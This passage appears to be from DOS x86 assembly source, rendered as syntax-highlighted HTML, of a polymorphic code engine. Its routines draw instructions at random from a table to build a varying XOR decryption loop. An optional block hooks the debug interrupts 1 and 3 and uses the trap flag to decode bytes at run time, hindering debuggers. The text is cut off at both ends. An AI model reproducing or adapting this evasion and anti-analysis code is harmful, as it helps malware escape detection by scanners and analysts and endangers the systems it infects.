            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9248h</span><span class="sc0">    </span><span class="sc1">; add random pattern</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; rotate</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; three</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; times.</span><span class="sc0">
            </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">rand_seed</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">    </span><span class="sc1">; put it back</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">; ONLY NEED LOWER 3 BITS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">setrtn</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ret near</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">setrtn</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gencode</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">l999</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; has this code been used yet?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">l999</span><span class="sc0">   </span><span class="sc1">; if this code was generated - try again</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; set the code as used in dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; the look-up index</span><span class="sc0">
                </span><span class="sc6">sal</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; the count of instructions</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ptr2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ax = address of code to be moved</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">; move the code into place</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gencode</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gen2</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">; used code</span><span class="sc0">
</span><span class="sc5">l990</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gencode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; do we need more code</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dat3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the mask for the required code</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dat3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l990</span><span class="sc0"> </span><span class="sc1">; if still need required code - loop again</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gen2</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
</span><span class="sc5">doint3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; point to next address</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">nobugptr</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">   </span><span class="sc1">; get the byte following int 3</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; set the trap flag</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">doint1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">nobugptr</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; clear the trap flag</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">bugiret</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">bugon</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ptr2</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc5">doint3</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int3vec</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ptr2</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc5">doint1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int1vec</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int1vec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int3vec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">bugoff</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">oldint3</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int3vec</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">oldint1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int1vec</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">oldint1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int1vec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">oldint3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int3vec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the data area</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">data_begin</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">T10</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc5">T11</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
</span><span class="sc5">T12</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
</span><span class="sc5">T13</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
</span><span class="sc5">T14</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">CLC</span><span class="sc0">
</span><span class="sc5">T15</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">CLD</span><span class="sc0">
</span><span class="sc5">T16</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">T17</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">T18</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">T19</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">T20</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc5">T21</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">T22</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">T23</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">T24</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">T25</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">T26</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">T27</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">T28</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">T29</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">T30</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc5">T31</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">T32</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc5">T33</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">T34</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">T35</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">T36</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">CLC</span><span class="sc0">
</span><span class="sc5">T37</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">T38</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">T39</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">T40</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">T20</span><span class="sc0">
</span><span class="sc5">T41</span><span class="sc0">              </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L11</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T12</span><span class="sc4">-</span><span class="sc5">T11</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T11</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L12</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T13</span><span class="sc4">-</span><span class="sc5">T12</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T12</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L13</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T14</span><span class="sc4">-</span><span class="sc5">T13</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T13</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L14</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T15</span><span class="sc4">-</span><span class="sc5">T14</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T14</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L15</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T16</span><span class="sc4">-</span><span class="sc5">T15</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T15</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L16</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T17</span><span class="sc4">-</span><span class="sc5">T16</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T16</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L17</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T18</span><span class="sc4">-</span><span class="sc5">T17</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T17</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L18</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T19</span><span class="sc4">-</span><span class="sc5">T18</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T18</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L21</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T22</span><span class="sc4">-</span><span class="sc5">T21</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T21</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L22</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T23</span><span class="sc4">-</span><span class="sc5">T22</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T22</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L23</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T24</span><span class="sc4">-</span><span class="sc5">T23</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T23</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L24</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T25</span><span class="sc4">-</span><span class="sc5">T24</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T24</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L25</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T26</span><span class="sc4">-</span><span class="sc5">T25</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T25</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L26</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T27</span><span class="sc4">-</span><span class="sc5">T26</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T26</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
